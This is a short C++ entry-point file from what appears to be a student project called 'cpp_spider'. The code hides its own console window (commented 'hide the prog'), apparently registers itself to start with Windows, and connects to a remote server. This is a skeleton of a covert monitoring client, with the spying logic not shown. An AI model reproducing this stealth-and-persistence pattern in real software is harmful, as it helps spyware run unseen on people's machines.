/*
** main.cpp for C:\Users\Sonny\Documents\Work\Epitech\cpp_spider
**
** Made by	Sonny Fournier
** Login	fourni_s
**
** Started on	Sat Sep 30 17:04:31 2017 Sonny Fournier
** Last update Sun Oct 08 23:13:59 2017 august_t
*/

#include "Client.hpp"

int         main()
{
    //hide the prog
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
    boost::asio::io_service     io_service;
    Client                      client(io_service);

    client.createSocket();
    client.startWithWindows();
    client.connect();
    io_service.run();
    return (0);
}
